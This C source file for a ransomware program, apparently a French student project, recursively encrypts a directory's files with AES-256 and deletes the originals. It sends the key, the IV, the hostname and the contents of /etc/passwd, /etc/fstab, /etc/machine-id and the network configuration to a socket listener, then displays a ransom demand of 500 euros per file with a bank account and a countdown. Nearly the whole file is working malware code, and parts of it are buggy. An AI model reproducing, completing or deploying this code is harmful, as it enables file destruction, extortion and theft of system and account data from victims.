#include "ransomlib.h"
#include <dirent.h> 
#include <sys/socket.h> // for socket
#include <unistd.h> 
#include <arpa/inet.h>

#define ip "127.0.0.1"
#define port 8080

void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
	printf("Procédure à suivre pour lancer le code:\n \n");
	printf("[1] -- Se mettre dans le dossier dans lequel le code s'y trouve\n");
	printf("[2] -- Taper la commande < gcc -o ransom ransom.c ransomlib.c -lcrypto > 	\n");
	printf("[3] -- Lancer le server dans un autre terminal avec la commande < nc -l -v -p 8080 >	\n");
	printf("[4] -- Revenez dans votre premier terminal pour lancer l'encryption \n");
	printf("[5] -- La commande est celle ci : < ./ransom (chemin du repertoire à encrypter) -enc >	\n");
	printf("[6] -- Récuperer la clé et l'iv sur le server\n");
	printf("[7] -- Décrypter : <./ransom (chemin du répertoire à décrypter) -dec (clé) (iv)>	\n");
	printf("--------------------------------------\n");

	printf("[-enc] --> Encryption	\n");
	printf("[-dec] --> Decryption	\n");
	printf("[--help] --> Aide	\n");
}

int is_a_video(char *filename)
{
	int ext = strlen(filename)-4;
	char extention[4];

	for(int counter=0; counter<5; counter++)
	{
		extention[counter] = filename[ext+counter];
	}

	if(strcmp(extention, ".mp4")==0 || strcmp(extention, ".mkv")==0)
	{
		return 0 ; // Retourne le fichier vidéo (mp4 ou mkv)
	}
}

int is_encrypted(char *filename) //Ici on assure que le nom de nos fichiers cryptés seront en ".Pwnd"
{
	int ext = strlen(filename)-5;
	char extention[5] ;

	for(int counter=0; counter<6; counter++)
	{
		extention[counter] = filename[ext+counter];
	}

	if(strcmp(extention, ".Pwnd")==0)
	{
		return 0 ; // Retourne le fichier déjà crypté
	}
	
	else
	{
		return 1; // Retourne le fichier qui n'est pas encore crypté
	}
}

void timer (int mount)
{
	int is_paid = 0;
	
    	for(int counter = 10; counter > 0; counter--)
 	{
		printf("Il vous reste %d secondes.\n", counter);
		printf("Compte bancaire : BE56751251151 \n");
		sleep(1);
 	}
	
	printf("Avez-vous payé ? (1=Oui) \n");
	scanf("%d", &is_paid);
	
	if (is_paid == 1)
	{
		printf("Merci d'avoir payé : %d Euros \n", mount);
	}
	
	else
	{
		printf("Vos fichiers seront crypté à jamais!");
	}
	
}

int amount_to_pay(int nb)
{
	printf("Nombre de fichier crypté : %d	\n", nb);
	printf("Tarif par fichier crypté : 500 euros \n");
	int mount = nb*500;
	printf("Votre raçons à payer s'élève à : %d \n", mount);
	timer(mount);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag, int *nb)
{
	DIR* dir = opendir(name);
	
	if (dir == NULL)
	{
		handleErrors();
	}
	
	struct dirent* entity;
	entity = readdir(dir);
	
	while (entity != NULL)
	{
		 if (entity->d_name[0] != '.')
		{
			char path[BUFSIZE] = {0};
			strcat(path, name);
			strcat(path, "/");
			strcat(path, entity->d_name);
			
			if(entity->d_type == DT_DIR && strcmp(entity->d_name, ".")!=0 && strcmp(entity->d_name, "..")!=0)
			{
				listdir(path, iv, key, de_flag, nb);
			}
			
			if(de_flag=='e' && entity->d_type == DT_REG && is_encrypted(entity->d_name) !=0 && is_a_video(entity->d_name) !=0)
			{				
				encrypt(key, iv, path);
				
				*nb = *nb+1;
				remove(path);				
			}
			
			else if(de_flag=='d' && entity->d_type == DT_REG && is_encrypted(entity->d_name) !=1)
			{
				decrypt(key, iv, path);
				remove(path);
			}
		}
		entity = readdir(dir);
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
	{
		handleErrors();
	}
	
	bytes_to_hexa(key , pKey, sizeKey);
	bytes_to_hexa(iv , pIv, sizeIv);
}

void send_txt(char * filename, int sockID)
{
	FILE * file = fopen(filename, "r");
	char line[BUFSIZE];
	char filename_path[BUFSIZE] = {0};

	strcat(filename_path, "Les données viennent du fichier: ");
	strcat(filename_path, filename);
	strcat(filename_path, "\n");
	send(sockID, (const char *)filename_path, strlen(filename_path), 0);
	
	while (fgets(line, sizeof(line), file)) 
	{
		send(sockID, (const char *)line, strlen(line), 0);
	}
	fclose(file);
}

int send_key(char *pKey, char *pIv)
{
	int sockID;
	
	sockID = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in serveraddr;
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_port = htons(port);
	serveraddr.sin_addr.s_addr = inet_addr(ip);

	char *send_key = "La clé de la victime: ";
	char *send_iv = "L'IV de la victime: ";
	char *space = "\t \n";
	char *hostname= "Le nom de la machine: ";
	char *separate = "--------------------------------------\n";
	
	char hostname_buffer[BUFSIZE];

	if (connect(sockID, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) != 0) 
	{
		printf("La connexion avec le serveur a échoué !\n");
		exit(0);
	}
	else
	{
		printf("La connexion avec le serveur est réussie !\n");

		gethostname(hostname_buffer, sizeof(hostname_buffer));

		send(sockID, (const char *)send_key, strlen(send_key), 0);
		send(sockID, (const char *)pKey, strlen(pKey), 0);
		send(sockID, (const char *)space, strlen(space), 0); // Evite que la clé soit mélangé avec le texte qui suit
		send(sockID, (const char *)send_iv, strlen(send_iv), 0);
		send(sockID, (const char *)pIv, strlen(pIv), 0);
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)hostname, strlen(hostname), 0);
		send(sockID, (const char *)hostname_buffer, strlen(hostname_buffer), 0);
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/etc/fstab", sockID); // Envoie les UUID des partitions
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/sys/class/net/eth0/address", sockID); // Envoie la MAC adresse		
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/etc/machine-id", sockID); // Envoie l'identifiant de la machine
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/etc/passwd", sockID); // Envoie les noms d'utilisateurs et les noms des groupes
		
		send(sockID, (const char *)space, strlen(space), 0);
		send(sockID, (const char *)separate, strlen(separate), 0);
		send_txt("/etc/network/interfaces", sockID); // Envoie de la configuration réseau
	}
	close(sockID);
}

int main (int argc, char * argv[])
{
	unsigned char key[AES_256_KEY_SIZE];
	unsigned char iv[AES_BLOCK_SIZE];

	int sizeKey = AES_256_KEY_SIZE; 
	int sizeIv = AES_BLOCK_SIZE;
	int nb_encrpt_file = 0;
	
	if(strcmp(argv[2], "-enc")==0 && argc==3) 
	{
		char * pKey = (char *) malloc(sizeof(key)*2+1);
		char * pIv = (char *) malloc(sizeof(iv)*2+1);
		
		printf("The directory is %s\n", argv[1]);
		generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
		send_key(pKey, pIv);
		listdir(argv[1], iv, key, 'e', &nb_encrpt_file);

		free((char *)pKey);
		free((char *)pIv);
		memset(key, '\0', sizeKey); 
		memset(iv, '\0', sizeIv);		
		printf("--------------------------------------\n");
		amount_to_pay(nb_encrpt_file);
	}
	
	if (strcmp(argv[2], "-dec")==0 && argc==5)
	{
		hexa_to_bytes(argv[3] , key, sizeKey);	
		hexa_to_bytes(argv[4] , iv, sizeIv);
		listdir(argv[1], iv, key, 'd', &nb_encrpt_file);
		printf("Merci d'avoir payé la rançon !");
		memset(key, '\0', sizeKey); 
		memset(iv, '\0', sizeIv);
	}
	
	if(strcmp(argv[2], "--help")==0)
	{
		usage();
	}
}
